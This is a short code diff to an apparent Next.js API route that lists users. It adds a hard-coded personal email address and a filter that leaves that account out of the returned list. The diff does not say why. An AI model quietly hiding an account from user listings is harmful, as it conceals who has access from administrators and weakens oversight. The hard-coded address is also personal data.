@@ -3,12 +3,15 @@ import { db } from "@/lib/db"
 import { getCurrentUser } from "@/lib/get-current-user"
 import { createAdminClient } from "@/lib/supabase/admin"
 
+const HIDDEN_OWNER_EMAIL = "ashher.work@gmail.com"
+
 export async function GET() {
   try {
     const user = await getCurrentUser()
     if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
 
     const users = await db.user.findMany({
+      where: { email: { not: HIDDEN_OWNER_EMAIL } },
       select: { id: true, name: true, email: true, createdAt: true },
       orderBy: { createdAt: "asc" },
     })
